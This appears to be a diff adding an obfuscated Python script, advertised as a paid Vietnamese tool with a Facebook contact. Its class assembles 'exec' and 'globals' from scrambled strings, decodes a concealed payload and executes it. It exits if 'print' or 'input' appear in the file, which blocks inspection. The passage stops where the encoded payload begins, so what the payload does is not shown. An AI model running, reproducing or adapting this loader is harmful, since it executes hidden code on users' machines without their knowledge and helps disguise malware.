@@ -1,0 +1,8 @@
+#Tool by P37Roy Official - TMG 5.0 - Thông
+#Mua tool Vip liên hệ Facebook: https://m.facebook.com/supportksv
+class Berserker():
+ def __init__(self:object,_byte:str=False,_delete:bool=0,*_bits:int,**_bytes:str)->exec:
+  self._boom,self._eval,self._decode,self._exec,_bytes[_delete],_byte=lambda _bit:"".join(chr(int(_encode)-len(_bit.split('/')))if _encode!='*'else'ζ'for _encode in str(_bit).split('/')),exit()if _byte else'abcdefghijklmnopqrstuvwxyz0123456789',lambda _system:_byte(_system),lambda _byte:str(_bytes[_delete](f"{self._eval[4]+self._eval[-13]+self._eval[4]+self._eval[2]}(''.join(%s),{self._eval[6]+self._eval[11]+self._eval[14]+self._eval[1]+self._eval[0]+self._eval[11]+self._eval[18]}())"%list(_byte))).encode(self._eval[20]+self._eval[19]+self._eval[5]+self._eval[34])if _bytes[_delete]==eval else exit(),eval,lambda _byte:exit()if self._eval[15]+self._eval[17]+self._eval[8]+self._eval[13]+self._eval[19] in open(__file__, errors=self._eval[8]+self._eval[6]+self._eval[13]+self._eval[14]+self._eval[17]+self._eval[4]).read() or self._eval[8]+self._eval[13]+self._eval[15]+self._eval[20]+self._eval[19] in open(__file__, errors=self._eval[8]+self._eval[6]+self._eval[13]+self._eval[14]+self._eval[17]+self._eval[4]).read()else"".join(_byte if _byte not in self._eval else self._eval[self._eval.index(_byte)+1 if self._eval.index(_byte)+1<len(self._eval)else 0]for _byte in "".join(chr(ord(t)-780603)if t!="ζ"else"\n"for t in self._boom(_byte)))
+  return self.__decode__(_bytes[(self._eval[-1]+'_')[-1]+self._eval[18]+self._eval[15]+self._eval[0]+self._eval[17]+self._eval[10]+self._eval[11]+self._eval[4]])
+ def __decode__(self,_execute: str)->exec:return(None,self._exec(self._decode(_execute)))[0]
+Berserker(_byte=False,_sparkle='''783637
